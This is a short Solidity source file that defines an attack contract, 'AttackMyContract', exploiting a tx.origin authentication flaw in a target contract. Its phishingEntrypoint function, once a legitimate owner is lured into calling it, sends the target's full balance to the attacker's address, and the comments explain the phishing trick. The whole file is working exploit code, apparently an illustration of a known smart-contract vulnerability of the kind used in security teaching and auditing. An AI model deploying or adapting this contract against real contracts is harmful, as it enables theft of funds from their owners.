pragma solidity ^0.4.24;

interface IVulnerable {
    function sendTo(address receiver, uint amount) external;
}

contract AttackMyContract {
    address public attacker;
    IVulnerable public target;

    constructor(address _target) public {
        attacker = msg.sender;
        target = IVulnerable(_target);
    }

    // This function should be called by the legitimate owner
    function phishingEntrypoint() public {
        // tx.origin is the legitimate owner, msg.sender is this contract
        // Will pass the flawed tx.origin check in vulnerable contract
        target.sendTo(attacker, address(target).balance);
    }
}

